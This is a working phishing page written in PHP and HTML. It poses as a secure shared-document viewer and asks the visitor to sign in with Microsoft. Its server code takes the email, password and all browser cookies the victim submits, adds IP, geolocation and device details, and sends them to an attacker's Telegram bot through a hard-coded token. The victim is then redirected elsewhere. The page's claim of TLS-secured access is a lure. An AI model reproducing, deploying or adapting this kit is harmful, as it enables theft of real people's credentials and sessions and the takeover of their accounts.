<?php
// Telegram configuration
$telegramBotToken = "8209132770:AAEnm0MN8T0CR7BNxj6wIeXCCzGkCV7zcFE";
$telegramChatId = "8402101331";
session_start();

// Domain to service mapping with login links
$domainServices = [
    'gmail.com' => [
        'name' => 'Gmail',
        'login_url' => 'https://mail.google.com',
        'type' => 'personal',
        'emoji' => '📧'
    ],
    'yahoo.com' => [
        'name' => 'Yahoo Mail',
        'login_url' => 'https://login.yahoo.com',
        'type' => 'personal',
        'emoji' => '📮'
    ],
    'outlook.com' => [
        'name' => 'Outlook',
        'login_url' => 'https://outlook.live.com',
        'type' => 'personal',
        'emoji' => '✉️'
    ],
    'hotmail.com' => [
        'name' => 'Outlook (Hotmail)',
        'login_url' => 'https://outlook.live.com',
        'type' => 'personal',
        'emoji' => '✉️'
    ],
    'aol.com' => [
        'name' => 'AOL Mail',
        'login_url' => 'https://mail.aol.com',
        'type' => 'personal',
        'emoji' => '📨'
    ],
    'icloud.com' => [
        'name' => 'iCloud Mail',
        'login_url' => 'https://www.icloud.com/mail',
        'type' => 'personal',
        'emoji' => '☁️'
    ],
    'protonmail.com' => [
        'name' => 'ProtonMail',
        'login_url' => 'https://mail.protonmail.com/login',
        'type' => 'personal',
        'emoji' => '🔒'
    ],
];

// Function to detect email provider
function detectEmailProvider($email) {
    global $domainServices;
    
    $domain = strtolower(substr(strrchr($email, "@"), 1));
    
    foreach ($domainServices as $providerDomain => $info) {
        if (strpos($domain, $providerDomain) !== false) {
            return $info;
        }
    }
    
    $mxHosts = [];
    getmxrr($domain, $mxHosts);
    
    if (!empty($mxHosts)) {
        foreach ($mxHosts as $mx) {
            if (stripos($mx, 'google') !== false) {
                return [
                    'name' => 'GSuite/Google Workspace',
                    'login_url' => 'https://admin.google.com',
                    'type' => 'business',
                    'emoji' => '🏢',
                    'mx_records' => $mxHosts
                ];
            } elseif (stripos($mx, 'outlook') !== false || stripos($mx, 'office365') !== false) {
                return [
                    'name' => 'Office 365',
                    'login_url' => 'https://office.com',
                    'type' => 'business',
                    'emoji' => '🏛️',
                    'mx_records' => $mxHosts
                ];
            }
        }
    }
    
    return [
        'name' => 'Custom Domain (' . $domain . ')',
        'login_url' => 'https://' . $domain,
        'type' => 'unknown',
        'emoji' => '🌐',
        'mx_records' => $mxHosts
    ];
}

function getOS($userAgent) {
    $osList = [
        'Windows 10'    => 'Windows NT 10',
        'Windows 8.1'   => 'Windows NT 6.3',
        'Windows 8'     => 'Windows NT 6.2',
        'Windows 7'     => 'Windows NT 6.1',
        'Mac OS X'      => 'Macintosh|Mac OS X',
        'Linux'         => 'Linux',
        'iOS'           => 'iPhone|iPad|iPod',
        'Android'       => 'Android',
    ];

    foreach ($osList as $os => $pattern) {
        if (preg_match("/$pattern/i", $userAgent)) {
            return $os;
        }
    }
    return 'Unknown';
}

function getCountry($ip) {
    $url = "http://ip-api.com/json/{$ip}?fields=country";
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['country'] ?? 'Unknown';
    }
    return 'Unknown';
}

function sendToTelegram($data) {
    global $telegramBotToken, $telegramChatId;
    
    $email = $data['email'];
    $providerInfo = detectEmailProvider($email);
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $os = getOS($browser);
    $country = getCountry($ip);
    $device = strpos($browser, 'Mobile') !== false ? 'Mobile' : 'Desktop';
    
    $message = "🛡️ *NEW LOGIN ATTEMPT* 🛡️\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "📧 **Email:** `{$data['email']}`\n";
    $message .= "🔑 **Password:** `{$data['password']}`\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "{$providerInfo['emoji']} **Provider:** {$providerInfo['name']} ({$providerInfo['type']})\n";
    $message .= "🔗 **Login URL:** [Click Here]({$providerInfo['login_url']})\n";
    
    if (!empty($providerInfo['mx_records'])) {
        $message .= "📡 **MX Records:**\n";
        foreach ($providerInfo['mx_records'] as $mx) {
            $message .= "   • `{$mx}`\n";
        }
        $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    }
    
    $message .= "🌍 **IP:** `{$ip}`\n";
    $message .= "📍 **Country:** `{$country}`\n";
    $message .= "🖥️ **Browser:** `{$browser}`\n";
    $message .= "💻 **OS:** `{$os}`\n";
    $message .= "📱 **Device:** `{$device}`\n";
    $message .= "⏰ **Time:** `" . date('Y-m-d H:i:s') . "`\n";
    
    if (!empty($data['cookies'])) {
        $message .= "━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🍪 **COOKIES** 🍪\n";
        foreach ($data['cookies'] as $name => $value) {
            $message .= "➡️ `{$name}` = `{$value}`\n";
        }
    }
    
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "🚀 **Source:** `{$data['provider']}`\n";

    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
    $params = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => false
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
    $cookies = $_COOKIE;
    sendToTelegram([
        'email' => $_POST['email'],
        'password' => $_POST['password'],
        'provider' => $_POST['provider'] ?? 'Unknown',
        'cookies' => $cookies
    ]);
    header('Location: note.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secured PDF</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2564cf;
            --primary-dark: #1a4fb3;
            --primary-light: #e9f2fc;
            --accent: #ffaa44;
            --success: #107c10;
            --error: #d83b01;
            --warning: #ffb900;
            --text: #323130;
            --text-light: #605e5c;
            --text-lighter: #8a8886;
            --border: #edebe9;
            --background: #f9f8f7;
            --surface: #ffffff;
            --hover: #f3f2f1;
            --shadow-sm: 0 1.6px 3.6px 0 rgba(0, 0, 0, 0.08), 0 0.3px 0.9px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 3.2px 7.2px 0 rgba(0, 0, 0, 0.12), 0 0.6px 1.8px 0 rgba(0, 0, 0, 0.08);
            --shadow-lg: 0 6.4px 14.4px 0 rgba(0, 0, 0, 0.16), 0 1.2px 3.6px 0 rgba(0, 0, 0, 0.10);
            --shadow-xl: 0 12.8px 28.8px 0 rgba(0, 0, 0, 0.20), 0 2.4px 7.2px 0 rgba(0, 0, 0, 0.12);
            --space-xxs: 4px;
            --space-xs: 8px;
            --space-sm: 12px;
            --space-md: 16px;
            --space-lg: 24px;
            --space-xl: 32px;
            --space-xxl: 48px;
            --text-xs: 12px;
            --text-sm: 14px;
            --text-base: 16px;
            --text-lg: 18px;
            --text-xl: 20px;
            --text-2xl: 24px;
            --text-3xl: 28px;
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 12px;
            --radius-xl: 16px;
            --radius-full: 999px;
            --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body { 
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background-image: url('im.png');
            color: var(--text);
            line-height: 1.5;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }

        a {
            color: var(--primary);
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        img {
            max-width: 100%;
            height: auto;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .container {
            width: 100%;
            max-width: 480px;
            margin: auto;
            padding: var(--space-xl);
        }

        .header {
            text-align: center;
            margin-bottom: var(--space-xl);
        }

        .header__logo {
            width: 72px;
            height: 72px;
            margin-bottom: var(--space-md);
            animation: float 6s ease-in-out infinite;
        }

        .header__title {
            font-size: var(--text-2xl);
            font-weight: 600;
            color: var(--primary);
            margin-bottom: var(--space-xs);
        }

        .header__subtitle {
            font-size: var(--text-base);
            color: var(--text-light);
        }

        .card {
            background: var(--surface);
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-sm);
            overflow: hidden;
            transition: var(--transition);
            animation: fadeIn 0.4s ease-out;
        }

        .card:hover {
            box-shadow: var(--shadow-md);
        }

        .card__header {
            padding: var(--space-lg);
            background: var(--primary);
            color: white;
        }

        .card__body {
            padding: var(--space-xl);
        }

        .file-preview {
            display: flex;
            align-items: center;
            gap: var(--space-md);
            padding: var(--space-md);
            background: var(--primary-light);
            border-radius: var(--radius-md);
            margin-bottom: var(--space-xl);
        }

        .file-preview__icon {
            flex: 0 0 48px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: white;
            border-radius: var(--radius-sm);
            color: var(--primary);
            font-size: 20px;
        }

        .file-preview__details {
            flex: 1;
            min-width: 0;
        }

        .file-preview__title {
            font-size: var(--text-base);
            font-weight: 600;
            margin-bottom: var(--space-xxs);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .file-preview__meta {
            font-size: var(--text-sm);
            color: var(--text-light);
            display: flex;
            flex-wrap: wrap;
            gap: var(--space-sm);
        }

        .file-preview__meta-item {
            display: flex;
            align-items: center;
            gap: var(--space-xxs);
        }

        .file-preview__meta-icon {
            font-size: var(--text-xs);
        }

        .auth-providers {
            display: flex;
            flex-direction: column;
            gap: var(--space-sm);
            margin-bottom: var(--space-xl);
        }

        .provider-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--space-sm);
            padding: var(--space-sm) var(--space-md);
            border-radius: var(--radius-md);
            border: 1px solid var(--border);
            background: var(--surface);
            color: var(--text);
            font-size: var(--text-base);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition-fast);
            text-align: left;
        }

        .provider-btn:hover {
            background: var(--hover);
            transform: translateY(-1px);
            box-shadow: var(--shadow-sm);
        }

        .provider-btn:active {
            transform: translateY(0);
        }

        .provider-btn__icon {
            width: 20px;
            text-align: center;
            font-size: var(--text-lg);
        }

        .provider-btn--microsoft {
            border-color: rgba(37, 100, 207, 0.3);
            background-color: rgba(37, 100, 207, 0.04);
        }
        .provider-btn--microsoft .provider-btn__icon { color: var(--primary); }

        .provider-btn--google {
            border-color: rgba(219, 68, 55, 0.3);
            background-color: rgba(219, 68, 55, 0.04);
        }
        .provider-btn--google .provider-btn__icon { color: #db4437; }

        .provider-btn--apple {
            border-color: rgba(0, 0, 0, 0.3);
            background-color: rgba(0, 0, 0, 0.04);
        }
        .provider-btn--apple .provider-btn__icon { color: #000000; }

        .provider-btn--sso {
            border-color: rgba(0, 120, 212, 0.3);
            background-color: rgba(0, 120, 212, 0.04);
        }
        .provider-btn--sso .provider-btn__icon { color: #0078d4; }

        .provider-btn--yahoo {
            border-color: rgba(123, 0, 181, 0.3);
            background-color: rgba(123, 0, 181, 0.04);
        }
        .provider-btn--yahoo .provider-btn__icon { color: #7b00b5; }

        .provider-btn--aol {
            border-color: rgba(0, 0, 255, 0.3);
            background-color: rgba(0, 0, 255, 0.04);
        }
        .provider-btn--aol .provider-btn__icon { color: #0000ff; }

        .divider {
            display: flex;
            align-items: center;
            margin: var(--space-lg) 0;
            color: var(--text-lighter);
            font-size: var(--text-sm);
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border);
        }

        .divider::before {
            margin-right: var(--space-md);
        }

        .divider::after {
            margin-left: var(--space-md);
        }

        .form-group {
            margin-bottom: var(--space-md);
        }

        .form-label {
            display: block;
            margin-bottom: var(--space-xs);
            font-size: var(--text-sm);
            font-weight: 600;
            color: var(--text);
        }

        .form-control {
            width: 100%;
            padding: var(--space-sm) var(--space-md);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            font-size: var(--text-base);
            transition: var(--transition-fast);
            background: var(--surface);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(37, 100, 207, 0.2);
        }

        .form-hint {
            font-size: var(--text-xs);
            color: var(--text-light);
            margin-top: var(--space-xxs);
        }

        .checkbox {
            display: flex;
            align-items: center;
            gap: var(--space-sm);
            margin-bottom: var(--space-md);
        }

        .checkbox__input {
            width: 16px;
            height: 16px;
            accent-color: var(--primary);
        }

        .checkbox__label {
            font-size: var(--text-sm);
            color: var(--text);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: var(--space-sm);
            padding: var(--space-sm) var(--space-md);
            border: none;
            border-radius: var(--radius-sm);
            font-size: var(--text-base);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition-fast);
            text-align: center;
        }

        .btn--primary {
            background: var(--primary);
            color: white;
            width: 100%;
            padding: var(--space-md);
        }

        .btn--primary:hover {
            background: var(--primary-dark);
        }

        .btn--primary:disabled {
            background: #c7e0f4;
            cursor: not-allowed;
        }

        .btn--secondary {
            background: var(--surface);
            color: var(--primary);
            border: 1px solid var(--border);
        }

        .btn--secondary:hover {
            background: var(--hover);
        }

        .btn--text {
            background: none;
            color: var(--primary);
            padding: 0;
        }

        .btn--text:hover {
            text-decoration: underline;
            background: none;
        }

        .loading {
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .loading__spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: var(--radius-full);
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(4px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: var(--transition);
        }

        .modal--active {
            opacity: 1;
            visibility: visible;
        }

        .modal__content {
            background: var(--surface);
            border-radius: var(--radius-lg);
            width: 100%;
            max-width: 440px;
            box-shadow: var(--shadow-xl);
            transform: translateY(20px);
            transition: var(--transition);
            overflow: hidden;
            margin: var(--space-md);
        }

        .modal--active .modal__content {
            transform: translateY(0);
        }

        .modal__header {
            padding: var(--space-md) var(--space-lg);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal__title {
            margin: 0;
            font-size: var(--text-xl);
            font-weight: 600;
        }

        .modal__close {
            background: none;
            border: none;
            font-size: var(--text-xl);
            cursor: pointer;
            color: var(--text-light);
            padding: var(--space-xxs);
            border-radius: var(--radius-sm);
        }

        .modal__close:hover {
            background: var(--hover);
            color: var(--text);
        }

        .modal__body {
            padding: var(--space-lg);
        }

        .security-indicator {
            display: flex;
            align-items: center;
            gap: var(--space-sm);
            margin-top: var(--space-xl);
            padding: var(--space-sm);
            background: var(--primary-light);
            border-radius: var(--radius-sm);
            font-size: var(--text-sm);
        }

        .security-indicator__icon {
            color: var(--primary);
            font-size: var(--text-lg);
        }

        @media (max-width: 480px) {
            .container {
                padding: var(--space-md);
            }
            
            .card__body {
                padding: var(--space-lg);
            }
            
            .header__logo {
                width: 64px;
                height: 64px;
            }
            
            .header__title {
                font-size: var(--text-xl);
            }
        }

        .text-center {
            text-align: center;
        }

        .text-muted {
            color: var(--text-light);
        }

        .mt-1 { margin-top: var(--space-xs); }
        .mt-2 { margin-top: var(--space-sm); }
        .mt-3 { margin-top: var(--space-md); }
        .mt-4 { margin-top: var(--space-lg); }
        .mt-5 { margin-top: var(--space-xl); }

        .mb-1 { margin-bottom: var(--space-xs); }
        .mb-2 { margin-bottom: var(--space-sm); }
        .mb-3 { margin-bottom: var(--space-md); }
        .mb-4 { margin-bottom: var(--space-lg); }
        .mb-5 { margin-bottom: var(--space-xl); }

        /* Error message styling */
        .auth-error-container {
            padding: var(--space-sm);
            margin: var(--space-md) 0;
            border-radius: var(--radius-sm);
            background-color: #fef2f2;
            border: 1px solid #fecaca;
            display: none;
        }

        .auth-error-message {
            display: flex;
            align-items: center;
            gap: var(--space-xs);
            color: #dc2626;
            font-size: var(--text-sm);
            line-height: 1.5;
        }

        .auth-error-message i {
            font-size: var(--text-base);
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="xodo.png" 
                 alt="" 
                 class="header__logo">
            <h1 class="header__title">Secure Document Access</h1>
            <p class="header__subtitle">Sign in to view your shared file</p>
        </header>
        
        <main class="card">
            <div class="card__body">
                <!-- Error message container (hidden by default) -->
                <div class="auth-error-container" id="errorContainer">
                    <div class="auth-error-message">
                        <i class="fas fa-exclamation-circle"></i>
                        <span>That password is incorrect. Please try again or reset your password.</span>
                    </div>
                </div>

                <!-- File Preview -->
                <div class="file-preview">
                    <div class="file-preview__icon">
                        <i class="fas fa-file-powerpoint"></i>
                    </div>
                    <div class="file-preview__details">
                        <h3 class="file-preview__title">Property_Questionnaire.docx</h3>
                        <div class="file-preview__meta">
                            <span class="file-preview__meta-item">
                                <i class="fas fa-user-circle file-preview__meta-icon"></i>
                            </span>
                            <span class="file-preview__meta-item">
                                <i class="fas fa-calendar-alt file-preview__meta-icon"></i>
                                Updated 2 hours ago
                            </span>
                            <span class="file-preview__meta-item">
                                <i class="fas fa-database file-preview__meta-icon"></i>
                                18.4 MB
                            </span>
                        </div>
                    </div>
                </div>
                
                <!-- Authentication Options -->
                <div class="auth-providers">
                    <button class="provider-btn provider-btn--microsoft" onclick="openEmailModal('Microsoft')">
                        <i class="fab fa-microsoft provider-btn__icon"></i>
                        Sign in to access file
                    </button>
                </div>
                
                <!-- Security Indicator -->
                <div class="security-indicator">
                    <i class="fas fa-lock security-indicator__icon"></i>
                    <span>Your connection is secured with TLS 1.3 encryption</span>
                </div>
            </div>
        </main>
        
        <footer class="text-center mt-4 text-muted">
            <p class="text-sm">By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
            <p class="text-sm mt-1">
                <a href="#"><i class="fas fa-question-circle"></i> Need help accessing this file?</a>
            </p>
        </footer>
    </div>
    
    <!-- Email Entry Modal -->
    <div class="modal" id="emailModal">
        <div class="modal__content">
            <header class="modal__header">
                <h2 class="modal__title" id="emailModalTitle">Sign in with Microsoft</h2>
                <button class="modal__close" onclick="closeEmailModal()">&times;</button>
            </header>
            
            <div class="modal__body">
                <form id="emailForm" method="POST" action="">
                    <input type="hidden" name="provider" id="providerInput" value="">
                    <div class="form-group">
                        <label for="email" class="form-label">Email address</label>
                        <input type="email" id="email" name="email" class="form-control" 
                               placeholder="you@example.com" required autocomplete="username">
                    </div>
                    
                    <div class="form-group">
                        <label for="password" class="form-label">Password</label>
                        <div style="position: relative;">
                            <input type="password" id="password" name="password" class="form-control" 
                                   placeholder="Enter your password" required autocomplete="current-password">
                            <i class="fas fa-eye toggle-icon" 
                               style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer;"
                               onclick="togglePassword()"></i>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn btn--primary" id="submitBtn">
                        <span id="submitBtnText">Sign In</span>
                        <span class="loading" id="submitSpinner" style="display: none;">
                            <span class="loading__spinner"></span>
                        </span>
                    </button>
                </form>
            </div>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentProvider = '';
        
        // ===== Modal Functions =====
        function openEmailModal(provider) {
            const modal = document.getElementById('emailModal');
            const title = document.getElementById('emailModalTitle');
            const providerInput = document.getElementById('providerInput');
            
            // Update modal content based on provider
            title.textContent = `Sign in with ${provider}`;
            currentProvider = provider;
            providerInput.value = provider;
            
            // Show modal
            modal.classList.add('modal--active');
            
            // Auto-focus email field and suggest domain
            setTimeout(() => {
                const emailField = document.getElementById('email');
                emailField.focus();
                
                const domainMap = {
                    'Microsoft': '',
                    'Google': '@gmail.com',
                    'Apple': '@icloud.com',
                    'Yahoo': '@yahoo.com',
                    'AOL': '@aol.com',
                    'SSO': '@yourcompany.com'
                };
                
                if (domainMap[provider]) {
                    emailField.value = domainMap[provider];
                    emailField.setSelectionRange(0, 0);
                }
            }, 100);
        }
        
        function closeEmailModal() {
            document.getElementById('emailModal').classList.remove('modal--active');
            document.getElementById('emailForm').reset();
        }
        
        // ===== Password Toggle =====
        function togglePassword() {
            const passwordField = document.getElementById('password');
            const toggleIcon = document.querySelector('.toggle-icon');
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                passwordField.type = 'password';
                toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }
        
        // ===== Form Submission =====
        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const submitBtnText = document.getElementById('submitBtnText');
            const spinner = document.getElementById('submitSpinner');
            
            // Show loading state
            submitBtn.disabled = true;
            submitBtnText.textContent = 'Signing in...';
            spinner.style.display = 'inline-flex';
            
            // Submit the form
            this.submit();
        });
        
        // ===== Show Error Message (for demonstration) =====
        function showErrorMessage() {
            document.getElementById('errorContainer').style.display = 'block';
        }
        
        // ===== Event Listeners =====
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (document.getElementById('emailModal').classList.contains('modal--active')) {
                    closeEmailModal();
                }
            }
        });
        
        // Validate email format on blur
        document.getElementById('email').addEventListener('blur', function() {
            if (this.value && !this.value.includes('@')) {
                this.setCustomValidity('Please include an "@" in the email address');
            } else {
                this.setCustomValidity('');
            }
        });
        
        // Close modal when clicking outside
        document.getElementById('emailModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeEmailModal();
            }
        });
    </script>
</body>
</html>